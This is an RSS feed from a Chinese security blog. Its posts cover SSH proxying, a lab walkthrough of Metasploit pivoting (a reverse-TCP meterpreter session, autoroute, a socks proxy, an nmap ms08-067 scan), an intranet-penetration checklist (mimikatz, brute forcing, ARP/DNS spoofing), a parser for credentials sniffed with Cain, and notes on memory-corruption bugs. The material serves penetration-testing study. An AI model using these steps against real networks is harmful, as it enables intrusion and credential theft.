<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="https://www.w3.org/2005/Atom">
  <channel>
    <title>quanyechavshuo</title>
    <description>A blog about programming and network security</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Sat, 25 Feb 2017 11:21:20 +0800</pubDate>
    <lastBuildDate>Sat, 25 Feb 2017 11:21:20 +0800</lastBuildDate>
    <generator>Jekyll v3.3.1</generator>
    
      <item>
        <title>ssh正向反向代理理解</title>
        <description>&lt;h3 id=&quot;条件&quot;&gt;条件:&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;正身代理和反向代理都满足:
A能访问B,B能访问C,A不能访问C
假设A想访问C的80端口
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;正向代理&quot;&gt;正向代理:&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;A有B的ssh口令和密码,A利用B的ssh口令和密码来控制B给A做流量代理,A将要访问C的80端口的需求发给B,由B代理访问
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/正向代理.png&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;反向代理&quot;&gt;反向代理:&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C有B的ssh口令和密码,C利用B的ssh口令和密码来控制将C的80端口绑定到B的8000[或其他]端口,这样A访问B的8000端口
就相当于访问C的80端口
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/反向代理.png&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Fri, 24 Feb 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2017/02/24/ssh%E6%AD%A3%E5%90%91%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E7%90%86%E8%A7%A3/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2017/02/24/ssh%E6%AD%A3%E5%90%91%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E7%90%86%E8%A7%A3/</guid>
        
        <category>ssh</category>
        
        <category>代理</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>多重转发渗透隐藏内网</title>
        <description>&lt;h3 id=&quot;about&quot;&gt;About&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;内网机器如下:
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://pentest.blog/wp-content/uploads/final.png&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;说明:
1)Attacker为攻击者,有一个网卡,网段为172.16.0.0,Attacker系统为kali系统
2)RD为第一个已经渗透的目标,有两块网卡,对应172.16.0.0和7.7.7.0两个网段
3)JC有两块网卡,对应7.7.7.0和8.8.8.0两个网段,JC有ms08-067和efs bof两个漏洞,可getshell
4)SK有一块网卡,对应8.8.8.0网段,SK有vsftpd的漏洞,可getshell
5)起初Attacker只拿到RD的msf的shell,对于目标内网情况一无所知,也不知道存在7.7.7.0和8.8.8.0这两个隐藏的网段
6)目标是准备通过RD来渗透内网中7.7.7.0和8.8.8.0两个隐藏的网段
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;step1&quot;&gt;Step1&lt;/h3&gt;

&lt;p&gt;Attacker在RD上通过webshell运行了一个reverse类型的后门,然后操作如下:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &amp;gt; use exploit/multi/handler 
msf exploit(handler) &amp;gt; set payload windows/meterpreter/reverse_tcp
payload =&amp;gt; windows/meterpreter/reverse_tcp
msf exploit(handler) &amp;gt; set LHOST 172.16.0.20 
LHOST =&amp;gt; 172.16.0.20
msf exploit(handler) &amp;gt; set LPORT 1234
LPORT =&amp;gt; 1234
msf exploit(handler) &amp;gt; run
[*] Started reverse TCP handler on 172.16.0.20:1234 
[*] Starting the payload handler...
[*] Sending stage (957487 bytes) to 172.16.0.11
[*] Meterpreter session 2 opened (172.16.0.20:1234 -&amp;gt; 172.16.0.11:49162)
meterpreter &amp;gt; ifconfig
Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
Interface 11
============
Name         : Intel(R) PRO/1000 MT Desktop Adapter
Hardware MAC : 08:00:27:e1:3f:af
MTU          : 1500
IPv4 Address : 172.16.0.11
IPv4 Netmask : 255.255.255.0
Interface 19
============
Name         : Intel(R) PRO/1000 MT Desktop Adapter #2
Hardware MAC : 08:00:27:7f:3c:fe
MTU          : 1500
IPv4 Address : 7.7.7.11
IPv4 Netmask : 255.255.255.0
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;step2&quot;&gt;Step2&lt;/h3&gt;

&lt;p&gt;发现RD有两块网卡后,想办法渗透另一个网段7.7.7.0,首先要添加路由,操作如下:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; run autoroute -s 7.7.7.0/24
[*] Adding a route to 7.7.7.0/255.255.255.0...
[+] Added route to 7.7.7.0/255.255.255.0 via 172.16.0.11
[*] Use the -p option to list all active routes
meterpreter &amp;gt; run autoroute -p
Active Routing Table
====================
 Subnet Netmask Gateway
 ------ ------- -------
 7.7.7.0 255.255.255.0 Session 2
meterpreter &amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;然后开始扫描7.7.7.0网段,操作如下:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; run post/windows/gather/arp_scanner RHOSTS=7.7.7.0/24
[*] Running module against DISCORDIA
[*] ARP Scanning 7.7.7.0/24
[*]     IP: 7.7.7.11 MAC 08:00:27:7f:3c:fe (CADMUS COMPUTER SYSTEMS)
[*]     IP  7.7.7.12 MAC 08:00:27:3a:b2:c1 (CADMUS CIMPUTER SYSTEMS)
[*]     IP: 7.7.7.20 MAC 08:00:27:fa:a0:c5 (CADMUS COMPUTER SYSTEMS)
[*]     IP: 7.7.7.255 MAC 08:00:27:3f:2a:b5 (CADMUS COMPUTER SYSTEMS)
meterpreter &amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;arp_scanner不太够用,不能扫到端口信息[此时也可用msf自带的其他可以扫描端口的模块如auxiliary/scanner/portscan/tcp来扫
描,因为前面添加了路由],于是用Attacker本机的nmap来扫[可以更完全的扫描,nmap应该比msf中的扫描模块强大],首先在RD上开
sockets4代理,然后用proxychains设置nmap的代理为RD在Attacker的1080端口开启的代理,操作如下:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; background 
[*] Backgrounding session 2...
msf &amp;gt; use auxiliary/server/socks4a 
msf auxiliary(socks4a) &amp;gt; show options 
Module options (auxiliary/server/socks4a):
   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The address to listen on
   SRVPORT  1080             yes       The port to listen on.
Auxiliary action:
   Name   Description
   ----   -----------
   Proxy  
msf auxiliary(socks4a) &amp;gt; set srvhost 172.16.0.20
srvhost =&amp;gt; 172.16.0.20
msf auxiliary(socks4a) &amp;gt; run
[*] Auxiliary module execution completed
[*] Starting the socks4a proxy server
msf auxiliary(socks4a) &amp;gt; netstat -antp | grep 1080
[*] exec: netstat -antp | grep 1080
tcp        0      172.16.0.20:1080            0.0.0.0:*               LISTEN      3626/ruby       
msf auxiliary(socks4a) &amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;proxychains设置/etc/proxychains.conf如下:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[ProxyList]
# add proxy here ...
# meanwile
# defaults set to &quot;tor&quot;
#socks4  127.0.0.1 9050
socks4  172.16.0.20 1080
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;nmap扫描如下:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# proxychains nmap -sT -sV -Pn -n -p22,80,135,139,445 --script=smb-vuln-ms08-067.nse 7.7.7.20
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.25BETA1 ( https://nmap.org )
|S-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-7.7.7.20:445-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
|S-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-7.7.7.20:80-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
|S-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-7.7.7.20:135-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
|S-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-7.7.7.20:22-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
|S-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-7.7.7.20:139-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
|S-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-7.7.7.20:22-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
|S-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-7.7.7.20:135-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
|S-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-7.7.7.20:139-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
|S-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-7.7.7.20:445-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
|S-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-7.7.7.20:139-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
|S-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-7.7.7.20:135-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
|S-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-7.7.7.20:445-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
Nmap scan report for 7.7.7.20
Host is up (0.17s latency).
PORT     STATE    SERVICE      VERSION
22/tcp   open     ssh          Bitvise WinSSHD 7.16 (FlowSsh 7.15; protocol 2.0)
80/tcp   closed   http         Easy File Sharing Web Server httpd 6.9
135/tcp  open     msrpc        Microsoft Windows RPC
139/tcp  open     netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open     microsoft-ds Microsoft Windows 2003 or 2008 microsoft-ds
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2003
Host script results:
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs: CVE:CVE-2008-4250
|          The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, 
|          Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary 
|          code via a crafted RPC request that triggers the overflow during path canonicalization.
| 
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.51 seconds
root@kali:~#
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;现在发现了7.7.7.20(JC)这台机器端口开放比较多,尝试找出JC的漏洞,操作如下:
首先看看JC的80端口运行了什么cms,但是Attacker的浏览器直接访问http://172.16.0.20会无法访问,因为Attacker的网段与JC
不在同一网段,此处有个要注意的内容:&lt;/p&gt;
&lt;font color=&quot;red&quot;&gt;Attention:&lt;/font&gt;
&lt;font color=&quot;green&quot;&gt;
可以选择使用proxychains设置Attacker的浏览器的代理为RD在Attacker的1080端口上绑定[开启]的socks4代理入口[认为msf中的
auxiliary/server/socks4a模块类似于ssh反向代理],也可通过在RD的meterpreter会话中运行portfwd模块命令,portfwd命令如下:
&lt;/font&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; portfwd add -L 172.16.0.20 -l 2323 -p 80 -r 7.7.7.20
[*] Local TCP relay created: 172.16.0.20:2323 &amp;lt;-&amp;gt; 7.7.7.20:80
meterpreter &amp;gt;

meterpreter &amp;gt; portfwd list
Active Port Forwards
====================
   Index  Local             Remote       Direction
   -----  -----             ------       ---------
   1      172.16.0.20:2323  7.7.7.20:80  Forward
1 total active port forwards.
meterpreter &amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;通过访问Attacker的2323端口访问JC的80端口,结果如下:
&lt;img src=&quot;https://pentest.blog/wp-content/uploads/5.png&quot; /&gt;&lt;/p&gt;

&lt;pre color=&quot;green&quot;&gt;
这里的portfwd模块不只是名字上的端口转发的意思,目前笔者认为portfwd相当于半个ssh正向代理加一个ssh反向代理组成的综合命
令,ssh正向反向代理可参考这里的理解 &lt;a href=&quot;http://3xp10it.cc/web/2017/02/24/ssh%E6%AD%A3%E5%90%91%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E7%90%86%E8%A7%A3/&quot;&gt;ssh正向反向代理理解&lt;/a&gt;

笔者认为portfwd命令之后Attacker可以通过访问Attacker本身ip的2323端口进而访问到JC的80端口期间发生了3件事
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/dot/portfwd.png&quot; /&gt;

1.RD访问JC的80端口,这里相当于半个ssh正向代理
2.RD绑定已经访问到的JC的80端口的数据到Attacker的2323端口,这里相当于一个ssh反向代理
3.攻击者的浏览器访问攻击者自己的172.16.0.20:2323

portfwd的用法如下:
&lt;/pre&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; portfwd -h
Usage: portfwd [-h] [add | delete | list | flush] [args]
OPTIONS:
     -L &amp;gt;opt&amp;gt;  The local host to listen on (optional).
     -h        Help banner.
     -l &amp;gt;opt&amp;gt;  The local port to listen on.
     -p &amp;gt;opt&amp;gt;  The remote port to connect on.
     -r &amp;gt;opt&amp;gt;  The remote host to connect on.
meterpreter &amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;font color=&quot;green&quot;&gt;
其中-L只能设置为攻击者的ip,不能设置为肉鸡的ip,-L设置的ip可以是攻击者的内网ip,-r也可以是目标的内网ip,两个内网之
间通过meterpreter会话的&quot;隧道&quot;来连通,如果-L后设置的ip是攻击者的内网ip,-r后设置的是目标机器的内网ip,portfwd通过
meterpreter会话连通两台,-l是指攻击者的监听端口,运行完上面的portfwd add -L 172.16.0.20 -l 2323 -p 80 -r 7.7.7.20
命令后,Attacker的2323端口将变成监听状态(也即Attacker会开启2323端口)

这里还要注意route add命令只能是在meterpreter会话中有效,不能系统全局有效,笔者认为route add也是通过meterpreter会
话的&quot;隧道&quot;来实现攻击者能够访问目标机器其他网段机器的,也即在上面的Attacker通过portfwd来实现访问目标机器其他网段
机器而不能因为在portfwd模块运行前由于已经运行了route add模块而由Attacker的浏览器直接访问目标7.7.7.20:80,因为
route add只能在meterpreter的会话中起作用,只有meterpreter会话下可用的模块可以直接访问7.7.7.x网段
&lt;/font&gt;
</description>
        <pubDate>Thu, 23 Feb 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2017/02/23/%E5%A4%9A%E9%87%8D%E8%BD%AC%E5%8F%91%E6%B8%97%E9%80%8F%E9%9A%90%E8%97%8F%E5%86%85%E7%BD%91/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2017/02/23/%E5%A4%9A%E9%87%8D%E8%BD%AC%E5%8F%91%E6%B8%97%E9%80%8F%E9%9A%90%E8%97%8F%E5%86%85%E7%BD%91/</guid>
        
        <category>pivoting</category>
        
        <category>pentest</category>
        
        <category>msf</category>
        
        <category>ssh</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>内网渗透流程</title>
        <description>&lt;p&gt;假设已有webshell,无本地管理员权限&lt;/p&gt;

&lt;h3 id=&quot;step0-获取本地管理员权限&quot;&gt;Step0 获取本地管理员权限&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;各种exp尝试,如果失败免杀再试
2&amp;gt;本机配置文件,敏感文件查找
    a)数据库等配置文件
        https://github.com/3xp10it/bat/tree/master/get_web_config_bat
    b)psexec.exe[找文本内容为-u xx\xxx -p xxx的文件]
      cain.exe[找pop3.lst,http.lst,smtp.lst,ftp.lst文件]
      mimikatz.exe[找mimikatz.txt]
      (win下找文件可参考http://3xp10it.cc/web/2016/05/20/%E6%96%87%E4%BB%B6%E4%B8%80%E9%94%AE%E6%89%93%E5%8C%85/)
3&amp;gt;内网机器扫描开放端口情况,弱口令爆破
    (webshell下或reGeorg代理后用扫描器扫,如果失败则用msf生成马上传后用扫描模块,或者用hydra for win,或者用hscan,
    或者用scanline,或者用superscan命令行,优选scanline)
    eg.扫到一台1433 sa空口令,可用:
    a)菜刀中配置数据库连接并在菜刀中通过数据库执行命令,有时这个会失败,可能是菜刀的问题,如果失败可用下面3种
    b)sqltools在proxyfier+reGeorg下执行命令
        http://www.moonsec.com/post-322.html[用前要谨慎,或许有毒]
    c)navicat在proxyfier+reGeorg下执行菜刀中的数据库查询命令
    d)ssh反向代理[需要有一台公网ip机器开ssh服务,可在目标机器不能使用reGeorg等socket转发脚本时使用]
        https://github.com/louchaooo/louchaooo.github.io/issues/44
        [win开ssh服务:http://www.cnblogs.com/xred/archive/2012/04/21/2461627.html]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;step-1-获取域控管理员权限&quot;&gt;Step 1 获取域控管理员权限&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;找域控
2&amp;gt;找域控登录过的机器
3&amp;gt;抓密码
4&amp;gt;嗅探口令
5&amp;gt;dns+arp欺骗布置网马
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Sat, 18 Feb 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2017/02/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2017/02/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/</guid>
        
        <category>域渗透</category>
        
        <category>内网渗透</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>cain口令整理脚本</title>
        <description>&lt;h3 id=&quot;about&quot;&gt;About&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cain嗅探到的口令存放在cain目录下的lst文件中,包括pop3.lst,http.lst,smtp.lst,imap.lst,ftp.lst...等,脚本用法如下:
eg.
    用法1:
        python3 getCainKey.py pop3.lst
    用法2:
        from exp10it import getCainKey
        getCainKey(lstFile)

在同目录下生成pop3.lst-cainOutPut.txt为整理后的结果
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;code&quot;&gt;Code&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#参数为文件名
#也即cain目录下的.lst文件[pop3.lst,http.lst,smtp.lst,imap.lst,ftp.lst,...等包含用户名口令的文件]
#效果为在程序当前目录下生成一个xxx-cainOutPut.txt为整理后的文件
import re
import sys
with open(sys.argv[1],&quot;r+&quot;) as f:
    allLines=f.readlines()
AddedLines=[]
for eachLine in allLines:    
    #a=re.search(r&quot;[\S]+\s+-\s+[\S]+\s+[\S]+\s+[\S]+\s+([\S]+)\s+([\S]+)\s+[\S]+\s&quot;,eachLine,re.I)
    a=re.search(r&quot;[\S]+\s+-\s+[\S]+\s+[\S]+\s+[\S]+\s+([\S]+)\s+([\S]+).*\s&quot;,eachLine,re.I)
    if a:
        userField=a.group(1)
        passField=a.group(2)
        string2write=userField+&quot;:&quot;+passField+&quot;\n&quot;
        print(string2write)
        if string2write not in AddedLines:
            shouldWrite=1
            for each in AddedLines:
                if each[:len(userField)]!=userField: 
                    continue
                else:
                    if passField==each.split(&quot;:&quot;)[1][:-1]:
                        shouldWrite=0
                    break
            if shouldWrite==1:
                AddedLines.append(string2write)
                with open(sys.argv[1]+&quot;-cainOutPut.txt&quot;,&quot;a+&quot;) as f:
                    f.write(string2write)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;link&quot;&gt;Link&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://raw.githubusercontent.com/3xp10it/mytools/master/getCainKey.py&quot;&gt;getCainKey&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;attention&quot;&gt;Attention&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;使用cain过一段时间后如果要重新sniffe+arp需要在arp选项卡下重新扫描网络,重新设置arp欺骗时伪造的ip,然后再打开arp欺
骗开关,否则如果有机器重启后ip发生变化则不能欺骗到变化了ip的机器.另外实施arp欺骗时如果设置伪造ip为路由器所在
ip[eg.192.168.1.1]容易造成网络堵塞,造成内网无法访问互联网,也难以嗅探到密码,一般可将伪造ip设置为内网的非路由器的
如mysql,mssql,imap,pop3,smtp等服务器的ip

一般在访问一个https网站时经常出现说这个网站出错了,需要将url添加到信任才可访问,这种情况很有可能就是由于目标服务
器所在网络被sniffe+arp欺骗了,由cain在中间提供并非官方的cert证书,浏览器检测到cert异常才会提示网站访问出错,需要添
加信任才可访问.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Fri, 17 Feb 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/python/2017/02/17/cain%E5%8F%A3%E4%BB%A4%E6%95%B4%E7%90%86%E8%84%9A%E6%9C%AC/</link>
        <guid isPermaLink="true">http://localhost:4000/python/2017/02/17/cain%E5%8F%A3%E4%BB%A4%E6%95%B4%E7%90%86%E8%84%9A%E6%9C%AC/</guid>
        
        <category>cain</category>
        
        <category>python</category>
        
        
        <category>python</category>
        
      </item>
    
      <item>
        <title>删除github项目历史版本中的敏感文件</title>
        <description>&lt;h3 id=&quot;steps&quot;&gt;Steps&lt;/h3&gt;

&lt;p&gt;eg.删除https://www.github.com/3xp10it/MyToolKit项目历史版本中敏感文件&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.cd /tmp &amp;amp;&amp;amp; git clone https://github.com/dxa4481/truffleHog.git &amp;amp;&amp;amp; cd truffleHog
2.pip3 install -r requirements.txt
3.python3 truffleHog.py https://www.github.com/3xp10it/MyToolKit
    or
  python3 truffleHog.py https://github.com/3xp10it/MyToolKit.git
  此时找到了有敏感密码的文件my_bing_domains_v1_alone.py
4.cd /tmp &amp;amp;&amp;amp; git clone https://github.com/3xp10it/MyToolKit.git &amp;amp;&amp;amp; cd MyToolKit
5.cp my_bing_domains_v1_alone.py /tmp/
  这里是为了备份这个有敏感密码的文件
6.git filter-branch --force --index-filter 'git rm --cached --ignore-unmatch my_bing_domains_v1_alone.py' --prune-empty --tag-name-filter cat -- --all
  这里是为了删除所有commit中的my_bing_domains_v1_alone.py文件
7.git push origin --force --all
8.git push origin --force --tags
9.git for-each-ref --format='delete %(refname)' refs/original | git update-ref --stdin
10.git reflog expire --expire=now --all
11.git gc --prune=now
12.python3 /tmp/truffleHog/truffleHog.py https://www.github.com/3xp10it/MyToolKit
  这里是为了验证是否成功清除历史版本中的敏感文件
13.如果有需要,将备份的my_bing_domains_v1_alone.py有关密码的部分代码修改成没有明文密码后上传到github 
    cp /tmp/my_bing_domains_v1_alone.py /tmp/MyToolKit/
    cd /tmp/MyToolKit
    git add .
    git commit -a -m &quot;clean passwords&quot;
    git push -u origin master
    如果没有必要将my_bing_domains_v1_alone.py文件上传则这一步不需要,例如my_bing_domains_v1_alone.py文件是一个纯
    配置文件而没有关键代码的时候,这时直接将所有历史版本中的该文件删除即可
14.done
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;reffer&quot;&gt;Reffer&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://help.github.com/articles/removing-sensitive-data-from-a-repository/
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Mon, 16 Jan 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/auxilary/2017/01/16/%E5%88%A0%E9%99%A4github%E9%A1%B9%E7%9B%AE%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC%E4%B8%AD%E7%9A%84%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/</link>
        <guid isPermaLink="true">http://localhost:4000/auxilary/2017/01/16/%E5%88%A0%E9%99%A4github%E9%A1%B9%E7%9B%AE%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC%E4%B8%AD%E7%9A%84%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/</guid>
        
        <category>git</category>
        
        <category>github</category>
        
        <category>truffleHog</category>
        
        
        <category>auxilary</category>
        
      </item>
    
      <item>
        <title>UAF漏洞</title>
        <description>&lt;p&gt;0x00 理解&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;uaf漏洞叫作&quot;释放后重引用&quot;漏洞,触发漏洞在于&quot;重引用&quot;这个动作,而重引用之前要通过&quot;占坑&quot;方式来修改要&quot;重引用&quot;的指针对
应内存中的数据,然后&quot;重引用&quot;到变化了的构造好的数据,导致执行任意代码
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Thu, 12 Jan 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/01/12/UAF%E6%BC%8F%E6%B4%9E/</link>
        <guid isPermaLink="true">http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/01/12/UAF%E6%BC%8F%E6%B4%9E/</guid>
        
        <category>uaf</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>Double Free漏洞</title>
        <description>&lt;h3 id=&quot;0x00-link&quot;&gt;0x00 Link&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.Double Free浅析
http://php.ph/wydrops/drops/Double%20Free%E6%B5%85%E6%9E%90.pdf
2.freenote_x64堆漏洞double free利用
http://fanrong1992.github.io/2016/05/26/freenote-x64%E5%A0%86%E6%BC%8F%E6%B4%9Edouble-free%E5%88%A9%E7%94%A8/
3.freebuf CVE-2014-0502分析
http://www.freebuf.com/articles/network/27118.html
4.上面3中内含的Corelan ROPdb[基于单个dll收集通用rop链]
https://www.corelan.be/index.php/security/corelan-ropdb/    
5.目前认为:
    alloc(HeapAlloc,malloc)对应unlink
    free对应link
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-free对应link&quot;&gt;0x01 free对应link&lt;/h3&gt;

